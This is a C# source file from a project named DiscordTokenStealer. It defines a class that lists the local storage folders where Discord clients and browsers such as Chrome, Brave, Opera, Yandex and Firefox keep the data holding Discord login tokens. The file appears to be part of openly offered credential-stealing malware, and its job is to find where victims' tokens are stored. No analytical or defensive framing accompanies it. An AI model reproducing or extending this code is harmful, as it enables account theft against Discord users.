using DiscordTokenStealer.Helpers;

namespace DiscordTokenStealer.Discord;

public sealed partial class LevelDbSearchProvider : IDirectorySearchProvider
{
    public string Location { get; }

    public string SearchPattern { get; }

    public bool Exists => Directory.Exists(Location);

    public LevelDbSearchProvider(string path, string seachPattern = "*.ldb")
    {
        Location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
        SearchPattern = seachPattern;
    }
}

public sealed partial class LevelDbSearchProvider : IDirectorySearchProvider
{
    public static readonly LevelDbSearchProvider Discord = new("discord\\Local Storage\\leveldb");

    public static readonly LevelDbSearchProvider DiscordPTB = new("discordptb\\Local Storage\\leveldb");

    public static readonly LevelDbSearchProvider DiscordCanary = new("discordcanary\\Local Storage\\leveldb");


    public static readonly LevelDbSearchProvider GoogleChrome = new("Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDbSearchProvider Yandex = new("Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDbSearchProvider Brave = new("BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDbSearchProvider Opera = new("Opera Software\\Opera Stable\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDbSearchProvider? MozillaFirefox = DirectoryHelper.TryFindSubDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"), "storage\\default\\https+++discord.com\\ls", out string? dir) && dir != null ? new LevelDbSearchProvider(dir, "*.sqlite") : null;
}